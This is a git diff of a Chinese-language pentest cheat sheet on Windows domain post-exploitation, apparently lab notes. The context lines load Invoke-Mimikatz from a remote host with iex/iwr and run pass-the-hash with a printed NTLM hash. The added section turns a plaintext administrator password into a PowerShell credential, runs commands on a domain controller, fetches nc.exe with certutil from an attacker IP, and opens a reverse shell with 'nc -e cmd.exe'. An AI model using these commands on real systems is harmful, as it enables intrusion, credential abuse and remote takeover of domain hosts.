@@ -53,6 +53,39 @@ iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
 Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
 ```
 
+下面方法适用于得到了用户明文密码,但不是在RDP环境中（比如反弹shell中），使用这个用户身份执行命令
+
+处理密码
+```
+$pw = ConvertTo-SecureString "96dQ(8i498g32N" -AsPlainText -Force
+```
+处理用户凭据
+```
+$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
+```
+测试执行whoami命令
+```
+Invoke-Command -Computer hutchdc -ScriptBlock {whoami} -Credential $creds
+```
+如：
+```
+PS C:\windows\system32\inetsrv> Invoke-Command -Computer hutchdc -ScriptBlock { whoami} -Credential $creds
+Invoke-Command -Computer hutchdc -ScriptBlock { whoami} -Credential $creds
+hutch\administrator
+```
+表明用户身份是```hutch\administrator```
+
+把nc.exe传到靶机
+```
+certutil -urlcache -split -f "http://192.168.54.200/nc.exe" nc.exe
+```
+用nc反弹一个shell回来
+```
+Invoke-Command -Computer hutchdc -ScriptBlock {C:\windows\temp\nc.exe 192.168.54.200 593 -e cmd.exe} -Credential $creds
+```
+
+
+
 # 以某个用户的身份打开一个新的shell，有这个用户的所有权限，但是还在本机环境中（需要NTML）
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
